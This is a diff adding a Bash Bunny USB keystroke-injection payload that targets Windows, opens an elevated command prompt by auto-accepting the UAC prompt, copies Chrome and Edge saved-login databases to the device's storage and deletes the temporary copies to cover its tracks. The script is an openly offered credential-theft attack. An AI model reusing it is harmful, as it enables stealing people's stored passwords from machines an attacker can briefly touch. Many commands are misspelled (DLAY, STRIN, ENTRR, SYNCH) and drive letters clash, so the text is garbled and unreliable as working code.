@@ -1,0 +1,76 @@
+# Bash Bunny Payload - Browser Credential Exfiltration
+# Target: Windows Systems
+# Author: Anonymous
+
+# Initialize attack
+LED BLUE ON
+ATACKMODE HID STORAGE
+
+# Wait for device recognition
+Q DELAY 50
+
+# Set LED to show attack in progress
+LED RED
+
+# Open Run dialog
+GUI r
+DLAY 100
+
+# Open PowerShell with admin privileges
+STRIN powershell Start-Process cmd -Verb runAs
+ENTER
+Q DELAY 200
+
+# Wait for UAC prompt
+DLAY 300
+ALT y
+
+# Navigate to user profile
+STRINNG cd %USERPROFILE%
+ENTER
+Q DELAY 50
+
+# Extract Chrome credentials
+STRING copy "AppData\Local\Google\Chrome\User Data\Default\Login Data" %TEMP%\creds.db
+ENTER
+DLAY 75
+
+# Extract Edge credentials
+STRIN copy "AppData\Local\Microsoft\Edge\User Data\Default\Login Data" %TEMP%\creds2.db
+ENTER
+Q DELAY 50
+
+# List credential files to mounted storage
+STRING dir %TEMP%\creds*.db > D:\loot.txt
+ENTRR
+DLAY 100
+
+# Copy credential databases to Bash Bunny
+STRING copy %TEMP%\creds.db E:\exfil_chrome.db
+ENTER
+Q DELAY 75
+
+STRIN copy %TEMP%\creds2.db E:\exfil_edge.db
+ENTER
+DELAY 100
+
+# Clean up temp files
+STRING del %TEMP%\creds.db
+ENTER
+DELAY 50
+
+STRING del %TEMP%\creds2.db
+ENTRR
+DLAY 50
+
+# Close command prompt
+STRING exit
+ENTER
+
+# Attack complete
+LED GREEN FAST
+Q DELAY 500
+
+# Sync and finish
+SYNCH
+LED OFF
